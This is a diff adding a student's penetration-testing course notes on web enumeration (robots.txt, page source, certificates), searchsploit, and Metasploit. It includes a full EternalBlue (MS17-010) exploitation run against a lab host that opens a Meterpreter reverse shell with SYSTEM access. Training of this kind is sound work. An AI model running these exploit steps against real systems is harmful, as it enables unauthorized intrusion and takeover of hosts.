@@ -920,4 +920,210 @@ http://10.10.10.121 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[licens
 ```
 
 ## Certificates
-Another potential source of information if HTTPS is in use. 
+*Another potential source of information if HTTPS is in use.* 
+**SSL/TLS** certificates are another way of searching for information of a website. 
+Information that can be found includes:
+- Emails 
+- company names
+- location
+- etc...
+To enable a secure connect on your website, you must have a SSL/TLS certificate, so you are bound to find some stuff, even if minor. 
+
+### Robots.txt
+**Robots.txt** is a directory most websites have that **instructs search engine web crawlers such as Googlebot which resources CAN and CANNOT be accessed for indexing**
+- Can be used to find sensitive websites 
+- Shows allowed/disallowed entries
+
+### Source Code 
+**Source Code** is the code that makes up a web page. You can find valuable information here, especially as you learn to understand how websites work. 
+- Access it by doing [CTRL + U] 
+- May also contain developers comments 
+
+## Practice Machine 
+
+*Try running some of the web enumeration techniques you learned in this section on the server above, and use the info you get to get the flag*
+
+**Things I tried**:
+1. First, I looked at the source code using [CTRL + U], I did not find anything 
+2. Next, I checked if the page had anything interesting on robots.txt, I found this
+	`Disallow: /admin-login-page.php`
+3. I went to the directory and found it was a admin page. Now I went to the source code again and found a comment showing the `password and username`
+4. I logged in and found the flag
+
+# Public Exploits
+*Once we have found what kinds of services a server is running, we want to see if they have any exploits*
+
+## Finding Public Exploits
+*One of the best ways to find exploits is by googling the service + "exploit"*
+Another way to do this is by using a tool called **searchsploit**
+**To Install:**
+```shell-session
+sudo apt install exploitdb -y
+```
+**To Use it:**
+```Input
+searchsploit openssh 7.2
+```
+```Output
+----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                               |  Path
+----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+OpenSSH 2.3 < 7.7 - Username Enumeration                                                                                     | linux/remote/45233.py
+OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                                               | linux/remote/45210.py
+OpenSSH 7.2 - Denial of Service                                                                                              | linux/dos/40888.py
+OpenSSH 7.2p1 - (Authenticated) xauth Command Injection                                                                      | multiple/remote/39569.py
+OpenSSH 7.2p2 - Username Enumeration                                                                                         | linux/remote/40136.py
+OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Privilege Escalation                         | linux/local/40962.txt
+OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading                                                                     | linux/remote/40963.txt
+OpenSSH < 7.7 - User Enumeration (2)                                                                                         | linux/remote/45939.py
+OpenSSHd 7.2p2 - Username Enumeration                                                                                        | linux/remote/40113.txt
+----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+```
+*As seen above, all it takes is the keyword, and the name of the service, and it searches the internet for possible exploits to use on the many versions of a service.*
+
+There are also websites that can help find them, some include:
+- [Exploit DB](https://www.exploit-db.com) 
+- [Rapid7 DB](https://www.rapid7.com/db/)
+- [Vulnerability Lab](https://www.vulnerability-lab.com)
+- [Intro to Web Applications](https://academy.hackthebox.com/module/details/75)
+- Etc...
+## Metasploit Primer
+**Metasploit Framework (MSF)** is a useful took for having built-in exploits for many public vulnerabilities, providing an easy way to use them against vulnerable targets. Some of these tools include:
+- Running reconnaissance scripts to enumerate remote hosts and compromised targets
+- Verification scripts to test the existence of a vulnerability without actually compromising the target
+- Meterpreter, which is a great tool to connect to shells and run commands on the compromised targets
+- Many post-exploitation and pivoting tools
+
+**How to run Metasploit**
+```Input
+msfconsole
+```
+```Output
+      .:okOOOkdc'           'cdkOOOko:.
+    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
+   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
+  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
+  oOOOOOOOO.    .oOOOOoOOOOl.    ,OOOOOOOOo
+  dOOOOOOOO.      .cOOOOOc.      ,OOOOOOOOx
+  lOOOOOOOO.         ;d;         ,OOOOOOOOl
+  .OOOOOOOO.   .;           ;    ,OOOOOOOO.
+   cOOOOOOO.   .OOc.     'oOO.   ,OOOOOOOc
+    oOOOOOO.   .OOOO.   :OOOO.   ,OOOOOOo
+     lOOOOO.   .OOOO.   :OOOO.   ,OOOOOl
+      ;OOOO'   .OOOO.   :OOOO.   ;OOOO;
+       .dOOo   .OOOOocccxOOOO.   xOOd.
+         ,kOl  .OOOOOOOOOOOOO. .dOk,
+           :kk;.OOOOOOOOOOOOO.cOk:
+             ;kOOOOOOOOOOOOOOOk:
+               ,xOOOOOOOOOOOx,
+                 .lOOOOOOOl.
+                    ,dOd,
+                      .
+
+       =[ metasploit v6.0.16-dev                          ]
++ -- --=[ 2074 exploits - 1124 auxiliary - 352 post       ]
++ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
++ -- --=[ 7 evasion                                       ]
+```
+**One the console is running, you can search for exploits**
+```Input
+msf6 > search exploit eternalblue
+```
+```Output
+Matching Modules
+================
+
+   #  Name                                           Disclosure Date  Rank     Check  Description
+   -  ----                                           ---------------  ----     -----  -----------
+<SNIP>
+EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
+   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 
+```
+**Another search**
+```Input
+msf6 > use exploit/windows/smb/ms17_010_psexec
+```
+```Output
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+```
+**Exploit Found!** Now you must configure the options
+```Input
+Module options (exploit/windows/smb/ms17_010_psexec):
+```
+```Output
+ Name                  Current Setting                                                 Required  Description
+   ----                  ---------------                                                 --------  -----------
+   DBGTRACE              false                                                           yes       Show extra debug trace info
+   LEAKATTEMPTS          99                                                              yes       How many times to try to leak transaction
+   NAMEDPIPE                                                                             no        A named pipe that can be connected to (leave blank for auto)
+   NAMED_PIPES           /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
+   RHOSTS                                                                                yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT                 445                                                             yes       The Target port (TCP)
+   SERVICE_DESCRIPTION                                                                   no        Service description to to be used on target for pretty listing
+   SERVICE_DISPLAY_NAME                                                                  no        The service display name
+   SERVICE_NAME                                                                          no        The service name
+   SHARE                 ADMIN$                                                          yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
+   SMBDomain             .                                                               no        The Windows domain to use for authentication
+   SMBPass                                                                               no        The password for the specified username
+   SMBUser                                                                               no        The username to authenticate as
+
+...SNIP...
+```
+
+If **REQUIRED** is set to YES, that means for the exploit to actually work, you must have that option properly configured.
+**In the option above, there are 2 required:**
+- **RHOSTS** - You must have the IP of the target
+- **LHOST** - IP of the ATTACK Host, for us, it will be our tun0 interface. 
+```shell-session
+msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40
+RHOSTS => 10.10.10.40
+msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST tun0
+LHOST => tun0
+```
+RHOSTS is set to the machine we are attacking 
+LHOST is set to our machine we are attacking with 
+
+**Before we can finally attack, we must ensure the server is vulnerable**
+```Input
+msf6 exploit(windows/smb/ms17_010_psexec) > check
+```
+```Output
+[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
+[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
+[+] 10.10.10.40:445 - The target is vulnerable.
+```
+**While the *check* function will not always work, here it shows the website is indeed vulnerable**
+
+**To finally run the exploit, we run this:**
+```Input
+msf6 exploit(windows/smb/ms17_010_psexec) > exploit
+```
+```Output
+
+[*] Started reverse TCP handler on 10.10.14.2:4444 
+[*] 10.10.10.40:445 - Target OS: Windows 7 Professional 7601 Service Pack 1
+[*] 10.10.10.40:445 - Built a write-what-where primitive...
+[+] 10.10.10.40:445 - Overwrite complete... SYSTEM session obtained!
+[*] 10.10.10.40:445 - Selecting PowerShell target
+[*] 10.10.10.40:445 - Executing the payload...
+[+] 10.10.10.40:445 - Service start timed out, OK if running a command or non-service executable...
+[*] Sending stage (175174 bytes) to 10.10.10.40
+[*] Meterpreter session 1 opened (10.10.14.2:4444 -> 10.10.10.40:49159) at 2020-12-27 01:13:28 +0000
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter > shell
+Process 39640 created.
+Channel 0 created.
+Windows 7 Professional 7601 Service Pack 1
+(C) Copyright 1985-2009 Microsoft Corp.
+
+C:\WINDOWS\system32>whoami
+NT AUTHORITY\SYSTEM
+```
+**The exploit used was able to give us access to the machine, and now are the admin user**
+
+## Practice Box 
+
+*Try to identify the services running on the server above, and then try to search to find public exploits to exploit them. Once you do, try to get the content of the '/flag.txt' file.*
